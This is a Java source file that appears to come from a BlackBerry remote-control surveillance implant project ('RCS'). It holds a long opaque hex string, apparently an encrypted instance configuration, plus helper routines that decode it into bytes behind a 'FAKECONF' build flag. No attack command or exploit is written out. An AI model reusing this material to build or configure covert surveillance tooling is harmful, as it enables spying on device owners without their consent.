//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    // 3012
    static String configString = "37859ac95b903efa563a0a5947a3afa1c5e6d9c7a510adce4b0bbc656f9408ed9325df551d3e9da77e5f61630b41d00e45e1c78ca3a22cf8fde8f9bc2d8e8feece9fc8efbc3369b25a2406bd8452f9125bef0c095121febac5e63f35f4af1d6d360d560938adc8872d0d43ef780ec1881673652417c0b20635925fc7dd3a43f72c9548870e6fc3292bff96bff9d669c1135b266bab0099b4c7398477fd7998e3ec4f7d017922b4d7800381f15620c62ae75e79cd71cef331fce6492a6cf6d02f879b5a32c9ac3262a251f9101520bf251bca75be032e3b1f57cd94c803743e2e6f7c2af822d6f54f95b157c711d65b8ee98cf64cf9ba430bede1eb2a684fc420d2feb79cbbfe9950e69ea4cc4e440e0f480cff59f1c16abe46b9056af0a7fa3e7e8e778e753b620cd4a0ee6437ac53fde6fbafb15b95fac6fe9cc7446c0c9db35ef07319a9b6fc66f8e69f57cfbbb67044d14b48947b3f925e425c412f8f580f713932c6f2f6806aa9f432dc68bdac86bf442c13a6b44c5879729b2b065deb3088770e311c7fabc24da228a2e24e8cb97c654c8d192381b1698e75ed190cdf11f34b52fe47285f7d3b53ec0530c36bfbea5962e7212f10d31e0010d74468ace04d2078e5095324979dff76c600bd349b3c5ecbfd9485d36ea77da3d64bdb24e93820830186bc76e654118ef9203f79c9a2f784d45c6d45533dbd15fdb2d45f71603f744ca30d47c8402d37aaf233f3ee3309a3d5492fc95550ab7db11c1f90d299bcfc2c9fd59aef0256b025e0be6b98e1a3e5f5adbd7e6244de4b5124f30246c2ac0f77af23b6721491457c7b1577c0aeaebdb50727cf0c44d38a4f4716ef77cb81e9dfedc88dfe92003371b3ea016a264ff96861b65875cd4937db2652cbd7e8b85bae225ce8ff189fa34fca3e3847509dfc83d784ab5bbb26c39d1812641bc67e6d4f6857adfd474304ee8aad3d7ecf8547dd708b3099066bd0b55204840975b991ed5f02dffc5e7944f76cce42e736b328e095ecd69fd65d62a06478bc28b069d586e5444e2e0392b05c71499590395cf8cd42479f04986818ec33b3b30253dd11180412c34d534a019a3c52ab80baecb81c67a554f355d2c854b4b40b31b151efa526e4d78689d3a8445a00a9c5cfd0e4a8220e4def8b90ab9b7ec12492ee68fe81700a38fb3b1c62c29f607995de833828bcc4706bcbe7bc36d73a8addcd3df4a3a7c64acf12cd914091b91b211f6e67989dc23322450bf3007a2dd2c57efd122d22baedada3c1ce729540d31b1ed96af049533b6f3a031f86351eaf7560bd5ec16b4a715a3ba40c50b6d4c9eddb8e6a739d9efe4482ec37bd6bf09c7bd84cc8ef3a55b7e31d49c8ec246e6072c1c45b0a81886f158c08cbcb2b182d4fa43002c339180115385b8067f685f723323db2912cceff49bf653b0b4d79b2d6b1bcff6d452c6145b7051d609dc60440595c67f8e355d8ea94d6cea20e922b96ddb152b8e7a546cf6f2ec28f36a3eb273959c34698c0979613eb3e0a25aad73aab3bee38810161306bcb07f2543e325fc1c7755e60de8fddc48bb23137490e4c49886c84da90bdf4025f2ec89f3197b52de95ba1ff9256c6d31c4c001779dd25d679e55afbcf667bd3b21ac576ca669045124e5dfaf2037da01ecc01f82b8dcab884c97255bd0f99cea8d36b21be8a4ca2d9e80377a256e57d3ea11048dca2bb2bab5741158cc830d72238cad5c00a22446cde0727da0f47336d585bbf602106dae1bd02f0997143e003b4f363284c7a498d65b5e2809de832763e91aec5c8d320e998df0b651efe078f9d3689799dba6f0dbc65cee8bfde8791cd4093ea9c6cbcc78a514ce57e85664b60444a91fa9927fba3979422b5194751f645f41e7745378b425a4cc1bf73250ba71b83534f35fe2cdca7b42c14fb3e14cc3aa5f5ffddae7bff7a10ca5f0f202f598666892fb81e502834328afa3ed97123637d34d26ef0dbfafa7bf3092a8dc9389b56fb71533982b096667f796c4d5aed4370456379385039f93e17c41e93f5423fe4d456881b8c4a73766bab3c81a0462217355077c8e509de11fbac965d4a39b99ac7ab7dec784aea644049c5d6633e82fb872a66108fbbb749fb2138c33247cc08450c239aa25588873f9832da65d1a393166334e2d6e2c7b5697d31c4e1f6b839e9fb310fe8074977ff57764b325cdec47cdcc1cd5817464aec291fd33179cfd074f73b05716b14746e8603755f35c5d84ab9c51b4f6b9a2ddef9b1a54fb91f71e32dc21f9cee74dbbf3dd5994e1a1017f88ce547aa01a601761861fbd9fca7ec86b99b956c358cb37eb747e22e680ad9416171a2fc4948cb10e282d2ee7bd6971e8e290110e3c05d708dd370a61ed385c38114a041f8b37a22b3881f8a10d587189e5267de7d7bb1731f1334d21e202630bac5a1ff9ede3a3f60768b9e8515fd82ffe95de719446c4bb70ee81e3ffb834574da78bc0ee87bb7a87c8dbe145d59331322e33feb066c811f51bcdee8969d717f59d5532a6fec01e24917eca8d3c3fea6748984a52dd382b2c8f0ff3f31605d7872036660001a1fc759cb8025fb46664044ed5f4d8ff4472e2584196b1744a3c8b202375568b590a04dd382e3941cc69912c642d8e888fe535e8d4d1d269a56ce4b9ee102e0ff9d3ab262e49924891f473f322797e86de8bcee6112f881d86b2dd154ab6ab1f91280128bbbfb9eed853ce4c7e0b42b885dd53bbc8c59e5c38d1abcc3bb6ece30dd283a7d2e9b95a1ab9ab128e0f191f947855dc3e0808b4200538da6b8ef53e350985ed21db03a205163fcf74a407026715caec80361fea7069212b9af71768290b0035bebdea6d068970fbdcd633608c6693713fdd8d7885dab9ee3ec87746d191b0082988c32880052d4f10a818f389a155ab7a71c0b37ddbf0137a88ab70bf23c47c8de5c736ffc161eded879ba54b0a7c1e73e11eb6248204f3b7e434bf99efcbf095df6bd1c6edf7685e9dd8dc563bc6aa8d3ab3b889678a14ad6acc5e3a0968463845d10a730c6e9b739fb2124257246b83244e77c9c0d36ff7fa8261accc927064c595f3ade1be358d32e6d59e51887f9dbb328b9ef62284be7a74b21c30b6d79fdb77d8b150e4cb3440428ba753c0a6735e35084a2d25659e2d8efbf4541e102e2da12082d5a1c5247a265611cf374dfc12cad43e35806cbf88d3e2da6c84b6244a7fc42f13eafca74cbc5fb2eef59593b26f2a41204a40be84121822491d71a37568c9489d5e0ab1dacea18d2ced90ade4ba24069d160381728e3f76cdb99252eda02c290d605da4016ef851675ad581e464bac01487d60bec9eb98a560bf0b05c60bc9fde808e5d57fbbc39b31fa3cd66dc25a146faa90adae40b48328eab9cedb1abc3608a7d727ef68eadf3999942120bb91d384c01cec22f1d337ac1f8943762ddc0bb6813ff3c269b6f618c37096db11f568b3d149a46467f6de86f84b38ed83a40543dd9de5a59e0cbc080ec8c0746fff78886dcce0a100857f591a61976a4704d40e0005ea83c31e44407e8f5a90c15832f2186bfa7e685e9aaa8e05aa51a2473289fa8372d1376de9053752ebf400496e66d6";
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArrayWithLen(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArrayWithLen(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    public static byte[] hexStringToByteArray(final String config) {
        int len = config.length() / 2;
        final byte[] ret = new byte[ len ];

        for (int i = 0; i < ret.length; i++) {
            final char first = config.charAt((i ) * 2);
            final char second = config.charAt((i ) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif

    public static String getJson() {        
        return null;
    }
}

